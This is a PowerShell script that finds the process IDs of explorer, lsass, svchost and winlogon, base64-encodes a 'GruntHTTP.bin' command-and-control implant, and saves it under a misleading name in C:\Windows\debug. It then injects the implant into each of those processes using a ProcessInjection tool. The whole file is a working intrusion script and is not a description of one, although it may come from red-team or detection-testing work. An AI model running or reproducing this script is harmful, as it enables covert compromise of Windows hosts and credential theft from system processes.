# Get PID of first occurence of explorer.exe
(get-process explorer).id | Select-Object -First 1 -OutVariable explorerid
(get-process lsass).id | Select-Object -First 1 -OutVariable lsassid
(get-process svchost).id | Select-Object -First 1 -OutVariable svchostid
(get-process winlogon).id | Select-Object -First 1 -OutVariable winlogonid
(get-process spoolsv).id | Select-Object -First 1 -OutVariable spoolsid


# Find the absolute path to processinjection.exe and store in variable
$file = 'ProcessInjection.exe'
$searchinfolder = 'C:\'
$processInjection = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}

# Create .txt payload
$filename = Get-ChildItem -path C:\ -Filter GruntHTTP.bin -Recurse | %{$_.FullName}
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Windows\debug\wiatrace.txt

# Inject Payload into Memory
& $processInjection /pid:$explorerid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
& $processInjection /pid:$lsassid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
& $processInjection /pid:$svchostid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
& $processInjection /pid:$winlogonid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
